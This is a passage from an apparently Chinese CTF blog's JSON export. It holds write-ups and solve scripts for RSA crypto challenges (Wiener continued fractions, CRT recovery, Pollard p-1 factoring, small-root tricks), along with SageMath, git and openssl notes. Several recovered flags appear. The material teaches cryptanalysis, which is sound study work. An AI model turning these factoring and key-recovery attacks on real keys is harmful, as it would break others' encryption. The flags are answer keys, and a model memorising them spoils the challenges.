10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 # 32768 print(pow(m, e*a, n)) \u0026#39;\u0026#39;\u0026#39; for e in range(50000, 65536+50): E = a*e if(e%1000==0): print(e) if pow(m,E,n) == m: print(e) break \u0026#39;\u0026#39;\u0026#39; e = 54347 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 k_ = (e*a-1)//n print(k_) K_ = 364488564875886 h = a*e-1 for k1 in range(K_, K_+0xffff): if(h % k1 == 0): print(k1) print(\u0026#39;phi\u0026#39;, h//k1) # ----------------------------------------------- n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341 hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 phi = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677323144827364421857064114743919112397586714682327717591155281859878332878857637496812871055648464124306714796343117986409422875990360904379592919915948034655684834583955582963750039237702158594138221579562115747934168692201112328903250356981525515082719838720587009453696563480137185036274540174814218515651176 e = 54347 d = 4298016603089542483597241351887133616963086810642235365308002324004030601093655254875842951388303500539234141616526091370008960457210644879673875254010268684516397285320394226203385308757155700948533012423343861339508626943721344573385174040587806327861898850653183080217726965785724943775433346219983458931428497103383883062577219623496568538184452180371700595315860323243090009943680620842452188260283054761747020012268354097333918776896022588008512791625374380691241934242840621257445893290771708557244115630719160459380439474823867892787914640451469658906186018434932447473007312369559582186557910152024338800019 m = 234702123 print(pow(123,e*d,n)) print((pow(c,d,n))) # 234702123 challenge 2 # from Crypto.Util.number import * from gmpy2 import * m = 234702123 # 3 × 78 234041 m1 = 3 m2 = 78234041 p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841 q = 825745527393875213112416399161876312807690899587680405323661594634206777626830009225425708368452900127898718079772635289577153999013886667961217430074282603941419231606982549262875927598587116257227403646863891999503669499691226452373375235370860079746071677621652251885930328523487781646712042859931782618220703334721235289166285140690745773731238255224060549452664943877872987321262039002730465087234720391689961341109105478873987526603600402429600189003498632775079541462166163941851848765036872700541100390593375609399046693728399625801469156502270197170371875324720480650306785436605155686110619524005509832014145815734269685871332335544226747535167347621137129026799054475196918117687928602288868853220954790928729951229529274652854752754075975718778340195177601007255969037312694713797288603741759269754480872584968304627973646008573027346743614653988753674721004169739334587145202207452102165404828315977860122216069411238549765007288548786956279851184761238592429597293858204186200925553719690039361569082671701947951613715432578165026545428849347274156827008272891661068698821932170724135412872216787954099301438985821980885240717232218707592014222715174630839806063753862210894420887328995052744595750340725332465581373047 e = 0x10001 n = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821 c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721 # print(p*q*m) # c = pow(123, e, n) phi = (p-1)*(m1-1)*(q-1)*(m2-1) d = invert(e, phi) print(long_to_bytes(pow(c, d, n))) # 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047 challenge3 # from Crypto.Util.number import * n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081 c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414 x = 675003330981130439478093707252121278358852500850751357 M = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047000000000000000000000000000000000000000000000000000000 e = 5 c = pow(M+x, e, n) print(c) print(long_to_bytes(M+x)) # d0g3{e173c0f114c59c2bdea69c67422be407} 求x用这个脚本\nsagemath github 对M,C,N,e,beta做好限制就欧克了\n","date":"26 November 2020","permalink":"/achieve/2019to2021/%E5%AE%89%E5%AF%BBwp/","section":"archive","summary":"做了一点微小的工作","title":"安寻wp"},{"content":"🧓第一次打翔☁🧺，被迫读了一篇论文，晚上恰🔥锅想到了第二个脑残题，本来想着晚上来激情LLL结果被队友背刺了，\n想问一下某些队是怎么突然脑子开窍了一小时之内一起学会LLL了吗？\n放个sb wp以明悲愤之情\nsimpleRSA # sage\nfrom Crypto.Util.number import * e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452 m = 12345 c1 = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) m1 = pow(c1, d, n) if m1 == m: print(d) break print(long_to_bytes(pow(c,d,n))) # b\u0026#39;flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc}\u0026#39; more_calc # 这个题吃饭的时候突然想起这么做了，然后回器那电脑的时候发现被ban了😁\n$m^e \\equiv c;mod;q*p$\n$m^e \\equiv c\\equiv c_1;mod;p$\n如果 $p\u0026gt;m$(一般是大于的)\n$e*d\\equiv1;mod;p$\n$c^d\\equiv m^{ed}\\equiv m ;mod;n$\nsage\nimport gmpy2 from Crypto.Util.number import * p = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 c = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523 e = 0x10001 d = inverse(e,p-1) print(long_to_bytes(pow(c,d,p))) # b\u0026#39;flag{3d7f8da9-ee79-43c0-8535-6af524236ca1}\u0026#39; ","date":"25 November 2020","permalink":"/achieve/2019to2021/%E7%BF%94%E4%BA%91/","section":"archive","summary":"🧓第一次打翔☁🧺，被迫读了一篇论文，晚上恰🔥锅想到了第二个脑残题，本来想着晚上来激情LLL结果被队友背刺了，","title":"翔云"},{"content":"#整数域,有理数域和实数域 ZZ(3) QQ(0.25) RR(2^0.5) #复数域 CC(1,2) #生成虚数单位i i=ComplexField().gen();(2+i)*(4+3*i) #构造多项式环,返回具有给定属性和变量名的全局唯一的单变量或多元多项式环 #定义在整数域上的多项式环R，变量为w;ZZ也可换成其他数域 R.\u0026lt;w\u0026gt;=PolynomialRing(ZZ);R (1 + w)^3 #有限环 FR=Integers(17);FR #自身的代数扩展;exR=FR[w]/(w^2+3) exR=FR.extension(w^2+3)；exR #以python整数的形式返回所有可逆元素的列表 FR.list_of_elements_of_multiplicative_group() #假设环的乘法群是循环的，返回这个环的乘法群的生成元 FR.multiplicative_generator() #返回这个环的一个随机元素 FR.random_element() #上述几种方法对如下的域同样支持 #有限域 #素数域 G1=GF(37);G1 #伽罗瓦域 G2=GF(3^5);G2 # ans = c mod n 中国剩余定理扩展梭哈函数 # return ans, 通解的 ans+k*N (N = lcm([n1~ni])) crt(c,n) ","date":"24 November 2020","permalink":"/achieve/2019to2021/sagemath/","section":"archive","summary":"#整数域,有理数域和实数域 ZZ(3) QQ(0.","title":"sagemath基础"},{"content":" 周五打了个电信的破比赛，本来从教室赶回来只剩一个半小时了，刚写好exp服务器有炸了， 一气之下直接吃饭 :( 晚上7点才打到flag\nRSA parity oracle # RSA parity oracle选择密文攻击的一种，可以解得密文，原理是二分法和模运算的性质，大比赛里面还没怎么见过直接扒wiki打法来出题的（逗比星盟除外）,利用条件也比较苛\n核心二分 # wiki\nlb = 0\rub = N\rif server returns 1\rlb = (lb+ub)/2\relse:\rub = (lb+ub)/2\rexp及其附件 # 附赠一个临时写的垃圾的socket类\ngithub\n","date":"8 November 2020","permalink":"/achieve/2019to2021/%E7%94%B5%E4%BF%A1/","section":"archive","summary":"周五打了个电信的破比赛，本来从教室赶回来只剩一个半小时了，刚写好exp服务器有炸了， 一气之下直接吃饭 :( 晚上7点才打到flag","title":"socket快乐无边"},{"content":" 又是不记一下立马就会忘的东西\n下载 # git clone https://github.com/ljahum/xxxxxxxx 更新上传 # 向文件夹内传入新文件后\n更新.git\ngit add . 添加备注\ngit commit -m \u0026quot;frist commit\u0026quot; Pash回原来的位置（我这里是main）\ngit push -u origin main ","date":"5 November 2020","permalink":"/achieve/2019to2021/github%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","section":"archive","summary":"又是不记一下立马就会忘的东西","title":"Github基本使用"},{"content":"\rNOiSE 2021-1-19更新 # CRT 同余式性质及其应用 $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$\n$r_i\u0026lt;s$\n可以选取n的值得到\n$n_i r_i= c_i +s$\n$-c_i= s; mod;n_i$\nCRT得解 # ⑧说了，学到很多\nWP\nnoise # 题目附件\rserver\n这个题核心点在这段代码上\nprint(num * getrandbits(992) % secret) num是输入，乘上一个992bits的随机数后返回模上 secret 的结果。\n于是我们可以得到下式：\n$n_i\\cdot\\ g_i\\equiv c_i ;mod ;m$\n$n_i\\cdot\\ g_i=c_i+k\\cdot m$\n则有\n$0\\equiv c_i+k\\cdot m; mod ;n_i$\n若$k=1$则有下式\n$n_i-c_i\\equiv m;mod;n_i$\n若能求出多个上述式子，则有几率使用中国剩余定理求出$m$\n整点概率的东西 # 要$k=1$则需要$m\u0026lt;n_i\\cdot g_i\u0026lt;2m$,因为$g,m$有固定的bit长度，想怼参数取对数分析：\n$m,g$均有二分之一的概率分别大于$2^{1024},2^{992}$,当满足改条件时，设：\n$$ log(m)=2^{1024}\\cdot 2^\\gamma, log(n)=2^{32}\\cdot 2^\\beta , log(g)=2^{992}\\cdot 2^\\alpha $$\n可得下式：\n$$ \\gamma\u0026lt;\\beta\\cdot\\alpha\u0026lt;\\gamma +1 $$\n已知我们只能控制 $n_i$ 即 $\\beta$，又因为当$\\beta$过小时会有$m\u0026gt;n_i\\cdot g_i$则会出现$c_i=n_i\\cdot g_i$,验证是否过小只需要验证$c_i;mod ;n_i\\neq;0$就ok了\n所以综上，应该将$n_i$控制的尽量小。\n选取 $n$ # 因为我们求出的式子$n_i-c_i\\equiv m;mod;n_i$需要满足CRT的成立条件故所以$n_i$应该均为素数。\n这里用下式生成$n_i$:\npoint = int(sqrt(1.1)*pow(2,32)) ed = pow(2, 16) num = next_prime(getRandomRange(point-ed, point+ed)) 编写代码测试算法 # test.py\n平均测试下来30~40次时可以打通的，在可接受范围内 =v=\n","date":"5 November 2020","permalink":"/achieve/2019to2021/bytectf2020/","section":"archive","summary":"NOiSE 2021-1-19更新 # CRT 同余式性质及其应用 $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$","title":"字节CTF2020"},{"content":" 这种东西不记下来马上就会忘记 openssl下载速度就十分玄学。。。最后要自己配环境变量\nopenssl-rsa 基本使用 # 生成rsa密钥对（私钥） # 生成2048bit长度 包含 e,d,n,q,p,dp,dq openssl genrsa -out privkey.pem 2048\n提取公钥 # 包含 n,e openssl rsa -in privkey.pem -pubout -out pubkey.pem 提取csr证书 # openssl req -new -key privkey.pem -out ca.csr\n提取密钥信息 # 公私钥模数 # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\n提取所有信息 # openssl asn1parse -i -in privkey.pem\n公钥要指定偏移查看，bit string的偏移是19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npem、der格式转化 # openssl rsa -in .\\private.pem -outform der -out .\\private.der\n除了生孩子什么都能干的python # crypto yyds\nfrom Crypto.PublicKey import RSA\n读取公钥信息 # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) 生成秘钥对文件 # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() 对文件加解密 # 载入编码方式\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) 算得 n e d q p 生成 private_key.key # rsa_components = (n, e, int(d), p, q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # 此rsa与上文随机生成的rsa相同 f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"9 October 2020","permalink":"/achieve/2019to2021/openssl-rsa/","section":"archive","summary":"这种东西不记下来马上就会忘记 openssl下载速度就十分玄学。。。最后要自己配环境变量","title":"openssl-rsa和一些有关pem格式秘钥的一些情报"},{"content":" 今天碰巧又做了一遍这个题,除了之前用yafu嗯解，又去参考了一下paper解法\nChallenge Code # from random import choice from Crypto.Util.number import isPrime, sieve_base as primes from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u0026lt; bits: n *= choice(primes) # 前10000个速=素数中随机选一个 if isPrime(n + 1): return n + 1 e = 0x10001 m = int.from_bytes(flag.encode(), \u0026#39;big\u0026#39;) p, q = [getPrime(2048) for _ in range(2)] # q = 素数*素数....*素数 + 1 n = p * q c = pow(m, e, n) # n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 # c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 解法1 # 用yafu强行分解因数，因为数据太长，必须放入文件中来读取\n16953 :: ~\\Desktop\\Daily\\oi\\crypto » yafu \u0026#34;factor(@)\u0026#34; -batchfile .\\data.txt . . ***factors found*** PRP621 = 178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 PRP621 = 184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867 ans = 1 几秒就跑出来了，应该是程序察觉出了 n 可以用算法快速分解\n解法二 # 预期解为Pollard' p-1算法和smooth number两个知识点\n先介绍知识点\nPollard\u0026rsquo; p-1 算法 # https://blog.csdn.net/weixin_42251364/article/details/95462358\npollard’s p-1方法有点特殊，它只能应用在求整数n的一个素因子p，且p-1能被“小”因子整除的情况下，除此之外该方法无法正常应用。但是这个方法运用起来相当简单，所以在防止因式分解攻击时，必须考虑这一方法。\n考虑在一个标准的rsa中\n$n=p*q$\n设 $x\\equiv1;mod;p$\n故有 p|gcd(x-1,n)\n考虑费马小定理，有$a^{p-1}\\equiv1;mod;p$ 现在我们考虑构造一个$p-1$的倍数\n若$p-1$有多个小素因子，且每一个素数幂$q|(p-1)$，存在一个数B使$q\u0026lt;=B$ 则计算$B!$的值即为$p-1$的倍数 考虑费马小定理，则有$a^{B!}\\equiv;a^{k*(p-1)}\\equiv1;mod;p$\n$a^{B!}\\equiv;a^{k*(p-1)}\\equiv;x;mod;n$\n模除的分配律：(参考wiki模运算性质) $$ d;mod;abc\\equiv;(d;mod;a)+a*[(d/a)mod;b]+ab[(d/ a/b)];mod ;c $$\n故$x=;(a^{k*(p-1)}mod;p)+p[(x/p);mod;q]=1+k*p$\n故该$x-1$为$p$的倍数\n故计算$q=gcd(x-1),n=gcd(kp,qp)$\n得到q后可以轻松得到flag\nexp # # python2 from Crypto.Util.number import sieve_base as primes import gmpy2 n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 t=pow(2,2048) e = 0x10001 k=2 for i in range(10000): k=pow(k,primes[i],n) # 没乘方一次模一次n和最后再来模n的结果是一样的 if(k\u0026gt;t): if(i%15==0): # 随心情定每几次后判断一次 也可以乘方10000次后再判断，就怕电脑遭不住 if(gmpy2.gcd(k-1,n)!=1): # n只有q、p两个因数 print(gmpy2.gcd(k-1,n)) #178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139 break p=gmpy2.gcd(k-1,n) q=n//p phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) m=hex(pow(c,d,n))[2:] print(bytes.fromhex(m).decode(\u0026#39;utf-8\u0026#39;)) #NCTF{Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3} ","date":"2 October 